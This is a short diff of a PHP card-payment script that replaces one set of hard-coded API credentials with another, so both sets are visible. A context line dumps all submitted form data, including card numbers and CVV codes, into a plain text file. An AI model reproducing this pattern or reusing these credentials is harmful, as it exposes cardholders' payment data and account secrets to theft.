@@ -2,9 +2,9 @@
 file_put_contents('text.txt', json_encode($_POST));
 
 
-$user = 'luxeconcepts'; // API User Username
-$password = 'Pw4Fiverr1'; // API User Password
-$vendor = 'luxeconcepts'; // Merchant Login ID
+$user = 'kennefgdf'; // API User Username
+$password = 'kentiverr1'; // API User Password
+$vendor = 'kenvendour'; // Merchant Login ID
 $cardno=str_replace(' ', '', $_POST['ACCT']);
 $expdate=str_replace(' ', '', $_POST['EXPDATE']);
 $cvv2=$_POST['CVV2'];
